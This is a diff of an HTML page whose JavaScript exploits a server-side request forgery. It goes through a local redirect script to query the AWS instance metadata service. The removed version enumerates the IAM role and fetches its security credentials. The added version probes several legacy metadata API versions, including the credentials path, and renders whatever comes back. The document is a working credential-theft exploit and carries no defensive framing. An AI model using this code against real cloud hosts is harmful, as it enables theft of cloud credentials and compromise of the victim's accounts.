@@ -1,48 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS Metadata via Redirector</title>
+    <title>IMSv1 Metadata Test</title>
 </head>
 <body>
-    <h1>AWS Metadata Extraction via Working Redirector</h1>
+    <h1>Testing AWS Metadata v1.0 via Redirector</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Step 1: Test metadata root
-        try {
-            results += "<h2>Step 1: Metadata Root</h2>";
-            var xhr1 = new XMLHttpRequest();
-            xhr1.open('GET', 'http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/', false);
-            xhr1.send();
-            results += "<div style='background:#e8f5e8;padding:10px;'>SUCCESS: " + xhr1.responseText.length + " bytes</div>";
-            results += "<pre style='background:#f0f0f0;padding:10px;'>" + xhr1.responseText + "</pre>";
-        } catch(e) {
-            results += "<div style='background:#ffe8e8;padding:10px;'>ERROR: " + e.message + "</div>";
-        }
+        // Test different metadata service versions
+        var endpoints = [
+            'http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/',
+            'http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
+            'http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
+            'http://localhost/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
+            'http://localhost/redir.php?url=http://169.254.169.254/2009-04-04/meta-data/'
+        ];
         
-        // Step 2: Test IAM security credentials path
-        try {
-            results += "<h2>Step 2: IAM Security Credentials</h2>";
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open('GET', 'http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', false);
-            xhr2.send();
-            results += "<div style='background:#e8f5e8;padding:10px;'>SUCCESS: " + xhr2.responseText.length + " bytes</div>";
-            results += "<pre style='background:#f0f0f0;padding:10px;'>" + xhr2.responseText + "</pre>";
-            
-            // Step 3: If we got a role name, try to get its credentials
-            var roleName = xhr2.responseText.trim();
-            if(roleName && roleName.length > 0) {
-                results += "<h2>Step 3: Credentials for role: " + roleName + "</h2>";
-                var xhr3 = new XMLHttpRequest();
-                xhr3.open('GET', 'http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' + roleName, false);
-                xhr3.send();
-                results += "<div style='background:#e8f5e8;padding:10px;'>SUCCESS: " + xhr3.responseText.length + " bytes</div>";
-                results += "<div style='background:#fff;padding:10px;border:2px solid green;word-wrap:break-word;font-size:11px;'>" + xhr3.responseText + "</div>";
+        for(var i = 0; i < endpoints.length; i++) {
+            try {
+                results += "<h3>Test " + (i+1) + ": " + endpoints[i].split('url=')[1] + "</h3>";
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', endpoints[i], false);
+                xhr.send();
+                results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
+                results += "<pre style='background:#f0f0f0;padding:10px;font-size:11px;'>" + xhr.responseText + "</pre>";
+                
+                // If this gives us a directory listing, try to get credentials
+                if(xhr.responseText.includes('iam') || xhr.responseText.includes('security-credentials')) {
+                    results += "<div style='background:#ffff99;padding:5px;'>🔍 Found IAM reference, investigating...</div>";
+                }
+            } catch(e) {
+                results += "<div style='background:#ffe8e8;padding:5px;'>❌ " + e.message + "</div>";
             }
-        } catch(e) {
-            results += "<div style='background:#ffe8e8;padding:10px;'>ERROR: " + e.message + "</div>";
         }
         
         document.getElementById("results").innerHTML = results;
